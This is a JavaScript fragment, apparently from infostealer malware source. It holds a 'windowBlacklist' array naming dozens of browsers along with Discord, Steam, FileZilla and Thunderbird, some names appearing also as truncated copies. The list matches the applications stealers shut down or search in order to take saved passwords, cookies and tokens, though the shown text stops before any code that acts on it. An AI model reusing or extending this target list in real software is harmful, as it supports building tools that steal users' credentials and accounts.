...
module.exports = async () => {
  const windowBlacklist = ['Orbitum', 'Amigo', 'Torch', 'Kometa', 'cord', 'Waterfox', 'mullvad', 'firefox', 'chrome', 'mozilla', 'vivaldi', 'Opera', 'Epic', 'Sputnik', '7Star', 'CentBrowser', 'steam', 'filezilla', 'brave', 'BraveSoftware', 'brave.exe', 'msedge', 'edge', 'Uran', 'KMelon', 'Maxthon3', 'iebao', 'oowon', 'leipnir5', 'hromePlus', 'uperbird', 'afotech', 'aferTechnologies', 'uhba', 'orBrowser', 'lementsBrowser', 'ocCoc', 'oBrowser', 'IP Surf', 'Atom', 'liebao', 'Coowon', 'Sleipnir5', 'Superbird', 'Rafotech', 'SaferTechnologies', 'Suhba', 'TorBrowser', 'ElementsBrowser', 'CocCoc', 'GoBrowser', 'QIP Surf', 'RockMelt', 'Bromium', 'Comodo', 'Xpom', 'Chedot', '360Browser', 'Kmelon', 'PaleMoon', 'IceDragon', 'BlackHaw', 'Cyberfox', 'Thunderbird', 'SeaMonkey', 'Firefox', 'ockMelt', 'romium', 'omodo', 'pom', 'hedot', '60Browser'];
